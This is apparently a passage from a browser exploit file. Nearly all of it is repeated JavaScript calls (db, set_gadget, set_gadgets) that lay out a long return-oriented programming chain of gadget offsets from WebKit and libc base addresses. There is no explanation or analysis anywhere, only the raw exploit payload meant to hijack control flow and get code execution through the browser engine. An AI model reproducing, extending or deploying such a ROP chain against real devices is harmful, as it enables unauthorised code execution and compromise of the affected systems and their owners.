db([34, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+124736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+124752, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+124840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+124896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+124968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+125160, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+125264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+125280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+125392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+125408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+125496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+125552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+125632, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([35, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+125736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+125752, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+125840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+125896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+125968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+126112, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+126216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126376, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+126344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126360, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+126456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+126560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+126720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+126688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+126704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+126792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+126848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+126928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([36, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+127032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+127048, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+127136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+127264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+882884, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+127456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+127560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+127576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+127720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+127688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+127704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+127792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+127848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+127928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([37, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+128032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+128048, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+128136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+128264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+785097, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+128456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+128560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+128576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+128720, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+128688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+128704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+128792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+128848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+128928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([38, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+129032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129048, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+129136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+129192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+129320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129448, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+129432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129560, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129672, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+129656, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+129744, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+129832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+129880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+129976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+129960, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+130056, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+130296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+130328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+130280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+130584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+130616, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+130568, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+130728, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+130696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+130816, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+130920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+130936, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+131040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+131024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+131096, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+131272, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+131256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+131408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131424, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+131392, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+131592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+131576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+131712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+131776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+131728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+131896, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+131888, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+131912, 
ropchain+136032, 
libc_base+793877, 
ropchain+131952, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+132192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+132176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([36, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+132480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132512, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+132464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+132584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+132600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+132696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+132680, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+132776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+132880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+132896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+133016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+133000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+133136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+133304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+133288, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+133528, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+133728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+133712, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+133848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+133912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+133864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+134024, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+134016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+134040, 
ropchain+135672, 
libc_base+793877, 
ropchain+134080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+134184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+134200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+134352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134384, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+134368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+134336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134472, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+134600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+134584, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
